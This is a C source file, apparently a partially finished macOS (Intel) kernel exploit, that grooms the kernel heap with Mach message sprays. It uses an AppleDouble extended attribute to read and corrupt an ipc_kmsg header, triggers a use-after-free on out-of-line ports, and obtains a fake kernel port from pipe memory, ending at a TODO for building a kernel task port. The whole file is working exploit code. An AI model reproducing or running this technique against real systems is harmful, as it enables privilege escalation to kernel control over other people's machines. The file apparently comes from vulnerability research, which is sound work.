//
//  exploit.c
//  exploit-1
//
//  Created by Quote on 2020/5/26.
//  Copyright Â© 2020 Quote. All rights reserved.
//

#include <stddef.h> // for offsetof
#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <sys/xattr.h>
#include <assert.h>
#include <sys/time.h>
#include <errno.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>

#include "mycommon.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "k_offsets.h"
#include "user_kernel_alloc.h"
#include "ipc_port.h"

#include "apple_double.h"

// A convenience macro for accessing a field of a structure.
#define FIELD(object_, struct_, field_, type_)  \
        ( *(type_ *) ( ((uint8_t *) object_) + OFFSET(struct_, field_) ) )

static char OSData_holedata[0x41000 - 0x800]; // 65-page
static uint32_t OSData_holesize = sizeof(OSData_holedata);

int *pipefds;
void *pipe_buffer;
size_t pipe_buffer_size = 0x10000; // from 10.15?
kptr_t pipe_base;

uint32_t surface_key1 = '1yek';
uint32_t surface_key2 = '2yek';

size_t size_8PG  = 32 * KB;
size_t size_16PG = 64 * KB;

static void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail(__FUNCTION__);
}

static void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail(__FUNCTION__);
}

void exploit(void)
{
    bool ok;
    int err;

    printf("[>] %s\n", __func__);
    sys_init();
    fail_if(g_exp.pagesize != 4 * KB, "only works on intel mac");
    kernel_offsets_init();
    g_exp.zone_ipc_ports = 45;
    g_exp.zone_tasks = 60;

    create_xattr_template();

    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (char *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);

    void *kmsg_data = malloc(size_16PG * 2);
    memset_pattern4(kmsg_data, "kmsg", size_16PG * 2);
    void *ool_data = malloc(size_8PG);
    memset_pattern4(ool_data, "ool ", size_8PG);

    // 2. Initialize IOSurface.
    ok = IOSurface_init();
    assert(ok == true);

    // 4. Allocate 200 holding ports. Only about 29 will be used.
    struct holding_port_array holding_ports = holding_ports_create(200);
    struct holding_port_array all_holding_ports = holding_ports;

    // 10. Allocate 120 MB of 7-page kalloc allocations for a kalloc fragmentation. Put at most
    // 10 MB in each port. We want to fill the kalloc_map and start allocating from the
    // kernel_map near the middle of this spray.
    //
    // --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
    //   |  zalloc map  |     kalloc map  | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 |
    // --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
    struct ipc_kmsg_kalloc_fragmentation_spray fragmentation_spray;
    ipc_kmsg_kalloc_fragmentation_spray_(&fragmentation_spray,
            7 * g_exp.pagesize, 512 * MB, 10 * MB, &holding_ports);

    // 11. Free 30 MB of the fragmentation spray from each end. This should create enough free
    // space in both the kalloc_map and the kernel_map to satisfy most allocations smaller than
    // 8 pages.
    //
    // --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
    //   |  zalloc map  |     kalloc map  | 7 |   | 7 |   | 7 | 7 | 7 |   | 7 |   | 7 |
    // --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
    ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(&fragmentation_spray, 30 * MB, +1);
    ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(&fragmentation_spray, 30 * MB, -1);

    // 12. Allocate 200 MB of 8-page kalloc allocations. This should be enough to fill any
    // remaining 8-page holes in the kalloc_map and kernel_map and start allocating from fresh
    // VA space in the kernel_map.
    //
    // -+---+---+---+---+----+-----------+----+----+----+----+---------+-----------------------
    //  |   | 7 |   | 7 | 8  | old alloc | 8  | 8  | 8  | 8  | 8  | 8  |     fresh VA space ->
    // -+---+---+---+---+----+-----------+----+----+----+----+---------+-----------------------
    struct ipc_kmsg_kalloc_spray kalloc_8page_spray;
    ipc_kmsg_kalloc_spray_(&kalloc_8page_spray,
            NULL, 8 * g_exp.pagesize, 200 * MB, 0, &holding_ports);

    mach_port_t placeholder_16PG = holding_port_pop(&holding_ports);
    ipc_kmsg_kalloc_with_data(placeholder_16PG, kmsg_data, size_16PG);

    mach_port_t placeholder_8PG = holding_port_pop(&holding_ports);
    ipc_kmsg_kalloc_with_data(placeholder_8PG, kmsg_data, size_8PG);
    // allocate ool buffer which we'll also UAF
    mach_port_t ool_message_port = holding_port_pop(&holding_ports);
    spray_ool_pages(ool_message_port, size_8PG, NULL, 0, MACH_MSG_TYPE_MOVE_RECEIVE);

    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);

    // heap memory status
    //       [xattrinfo (16p)]
    // -----+-----------------+-----------+----------------+------------+-----
    //  ... |   kmsg (16p)    | kmsg (8p) | ool ports (8p) | pipe (16p) | ...
    // -----+-----------------+-----------+----------------+------------+-----

    // dump kmsg memory
    mach_port_destroy(mach_task_self(), placeholder_16PG);
    placeholder_16PG = holding_port_grab(&holding_ports); // stay here

    struct {
        uint32_t ikm_size;
        uint32_t pad_04;
        kptr_t ikm_next;
        kptr_t ikm_prev;
        uint64_t pad_18;
    } kmsg_header = {};
    err = getxattr(MOUNT_DIR "test/1.txt", "com.apple.FinderInfo", &kmsg_header, 32, 0, 0);
    if (err) {
        perror("setxattr");
    }
    util_hexprint(&kmsg_header, sizeof(kmsg_header), "kmsg header");
    pipe_base = kmsg_header.ikm_next + (8 + 8) * g_exp.pagesize;

    g_exp.fake_port_address = pipe_base;
    g_exp.fake_port_data = pipe_buffer;

    g_exp.fake_task_address = g_exp.fake_port_address + g_exp.pagesize;
    g_exp.fake_task_data = g_exp.fake_port_data + g_exp.pagesize;

    memset(ool_data, 0, size_8PG);
    *(uint64_t *)ool_data = g_exp.fake_port_address;

    kmsg_header.ikm_size += 8 * g_exp.pagesize;
    err = setxattr(MOUNT_DIR "test/1.txt", "com.apple.FinderInfo", &kmsg_header, 32, 0, XATTR_REPLACE);
    if (err) {
        perror("setxattr");
    }
    ipc_kmsg_kalloc_with_data(placeholder_16PG, kmsg_data, size_16PG);

    // kmsg size has been modified to 64KB
    mach_port_destroy(mach_task_self(), placeholder_8PG);
    placeholder_8PG = holding_port_grab(&holding_ports); // stay here

    // fill the 64KB hole
    ipc_kmsg_kalloc_with_data(placeholder_8PG, kmsg_data, size_8PG);
    OSData_kmem_alloc(surface_key1, ool_data, size_8PG, OSData_holedata, OSData_holesize);

    // heap memory status
    //       [xattrinfo (16p)]        UAF -> [ ool ports (8p) ]
    // -----+-----------------+-------------+------------------+------------+-----
    //  ... |   kmsg (16p)    | kmsg (8p)   | OSData bytes(8p) | pipe (16p) | ...
    // -----+-----------------+-------------+------------------+------------+-----

    void (^setup_fake_port_task)(void) = ^void (void) {
        // setup fake port & fake task
        memset(g_exp.fake_port_data, 0, g_exp.pagesize);
        memset(g_exp.fake_task_data, 0, g_exp.pagesize);

        FIELD(g_exp.fake_port_data, ipc_port, ip_bits,    uint32_t) = io_makebits(1, IOT_PORT, IKOT_NONE);
    };
    read_pipe();
    setup_fake_port_task();
    write_pipe();

    // receive back the fake ports
    struct ool_msg *ool = (struct ool_msg *)receive_message(ool_message_port, sizeof(struct ool_msg) + 0x1000);
    OSData_kmem_alloc(surface_key2, ool_data, size_8PG, OSData_holedata, OSData_holesize);

    // 23. Reallocating the OOL ports was our last act of kernel heap manipulation, so go ahead
    // and destroy all the holding ports. This won't destroy the ool_ports_msg_holding_port.
    holding_ports_destroy(all_holding_ports);

    mach_port_t fake_port = ((mach_port_t *)ool->ool_ports.address)[0];
    printf("[+] fake_port: %#x\n", fake_port);
    g_exp.fake_port = fake_port;
    free(ool);

    // =======================================================================
    // =======================================================================

    util_info("");
    util_info("TODO build tfp0 with the fake_port. Maybe I should update k_offsets for macOS 10.14.x");
    util_info("");

    fail("done everything, Ctrl-C to panic");

    // TODO fix kheap by yourself
    pipe_close(pipefds);
    free(pipefds);

    printf("[<] %s\n", __func__);
}
